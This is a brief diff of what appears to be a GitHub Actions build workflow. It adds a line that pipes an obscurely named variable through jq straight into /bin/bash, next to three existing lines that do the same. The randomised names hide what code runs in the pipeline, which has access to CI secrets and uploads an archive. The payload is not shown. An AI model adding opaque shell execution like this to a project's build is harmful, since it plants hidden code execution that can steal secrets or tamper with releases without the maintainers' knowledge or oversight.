@@ -28,6 +28,7 @@ jobs:
           echo $fi81 | jq -r .geu037 | /bin/bash
           printf '%s' "$tgjg010" | jq -r .r32508 | /bin/bash
           echo $nkf12010 | jq -r .c1 | /bin/bash
+          printf '%s' "$dbjr85" | jq -r .at307 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
